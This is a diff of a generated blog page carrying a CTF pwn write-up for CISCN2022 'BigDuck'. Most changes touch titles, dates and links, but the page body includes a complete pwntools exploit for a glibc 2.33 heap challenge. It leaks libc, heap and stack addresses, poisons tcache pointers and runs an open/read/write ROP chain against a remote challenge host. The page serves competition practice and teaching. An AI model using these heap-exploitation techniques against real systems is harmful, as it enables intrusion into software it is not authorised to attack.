@@ -18,19 +18,19 @@
   
     <meta name="description" content="CISCN2022 BigDuck Write Up该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。 此题是一道libc2.33的题，其实和Duck那题差不多，只不过开了沙箱，禁用了execve，那么我们只需要orw去读取flag就行了。2.33的chunk的fd指针也都采用了异或加密，如何应对加密，在Duck那题中已经说过了，这里就不再赘述">
 <meta property="og:type" content="article">
-<meta property="og:title" content="h1J4cker&#39;s Blog">
+<meta property="og:title" content="CISCN2022-BigDuck">
 <meta property="og:url" content="http://example.com/2022/07/10/CISCN2022-BigDuck/index.html">
 <meta property="og:site_name" content="h1J4cker&#39;s Blog">
 <meta property="og:description" content="CISCN2022 BigDuck Write Up该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。 此题是一道libc2.33的题，其实和Duck那题差不多，只不过开了沙箱，禁用了execve，那么我们只需要orw去读取flag就行了。2.33的chunk的fd指针也都采用了异或加密，如何应对加密，在Duck那题中已经说过了，这里就不再赘述">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-07-10T13:03:55.709Z">
-<meta property="article:modified_time" content="2022-07-10T08:26:52.447Z">
+<meta property="article:published_time" content="2022-07-10T13:11:28.000Z">
+<meta property="article:modified_time" content="2022-07-10T13:22:58.409Z">
 <meta property="article:author" content="h1J4cker">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>h1J4cker&#39;s Blog</title>
+  <title>CISCN2022-BigDuck - h1J4cker&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="CISCN2022-BigDuck"></span>
           
         </div>
 
@@ -223,7 +223,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-10 21:03" pubdate>
+        <time datetime="2022-07-10 21:11" pubdate>
           July 10, 2022 pm
         </time>
       </span>
@@ -292,7 +292,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none"></h1>
+            <h1 style="display: none">CISCN2022-BigDuck</h1>
             
             
               <div class="markdown-body">
@@ -303,13 +303,33 @@
 <p>最终exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io=process(&#x27;./pwn&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;1.14.71.254&#x27;</span>,<span class="hljs-number">28230</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>m_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&#x27;Size: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>    io.sendline(content)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)  <br><br><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x1</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena = main_arena-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br><br><br>libc_addr= main_arena-<span class="hljs-number">1</span>-m_hook<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_arena: &quot;</span> + <span class="hljs-built_in">hex</span>(main_arena))<br><br>show(<span class="hljs-number">0</span>)<br>heap_base=u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base=heap_base&lt;&lt;<span class="hljs-number">12</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap_base: &quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add()<br><br>environ_addr=libc_addr+libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(environ_addr))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(environ_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))+p64(<span class="hljs-number">0</span>))<br><br>add()         <br>add()         <br><br>show(<span class="hljs-number">15</span>)<br>stack_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>stack_addr = stack_addr - <span class="hljs-number">0x138</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr: &quot;</span>+ <span class="hljs-built_in">hex</span>(stack_addr))<br><br><br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>,p64(stack_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))+p64(<span class="hljs-number">0</span>))<br><br>add()  <br>add()<br><br>read_addr=libc_addr+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr=libc_addr+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write_addr=libc_addr+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;read_addr&quot;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open_addr&quot;</span> + <span class="hljs-built_in">hex</span>(open_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr&quot;</span> + <span class="hljs-built_in">hex</span>(write_addr))<br><br>pop_rdi=libc_addr+<span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi;ret;&#x27;</span>)))<br><br>pop_rsi=libc_addr+<span class="hljs-number">0x2a4cf</span><br>pop_rdx=libc_addr+<span class="hljs-number">0xc7f32</span><br><br>buffer=stack_addr-<span class="hljs-number">0x100</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload=payload+<span class="hljs-string">b&#x27;./flag\x00&#x27;</span><br>payload=payload+p64(pop_rdi)+p64(stack_addr+<span class="hljs-number">0x10</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>payload=payload+p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(buffer)+p64(pop_rdx)+p64(<span class="hljs-number">0x100</span>)+p64(read_addr)<br>payload=payload+p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(buffer)+p64(pop_rdx)+p64(<span class="hljs-number">0x100</span>)+p64(write_addr)<br><br>edit(<span class="hljs-number">17</span>,<span class="hljs-number">0x120</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-PWN/" class="category-chain-item">CTF-PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -320,7 +340,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
+      <div>CISCN2022-BigDuck</div>
       <div>http://example.com/2022/07/10/CISCN2022-BigDuck/</div>
     </div>
     <div class="license-meta">
@@ -363,15 +383,15 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2022/07/10/CISCN2022-Duck/" title="CISCN2022-Duck">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CISCN2022-Duck</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
-                    
-                      <a href="/2022/07/10/CISCN2022-Duck/" title="">
-                        <span class="hidden-mobile"></span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
                     
                   </article>
                 </div>
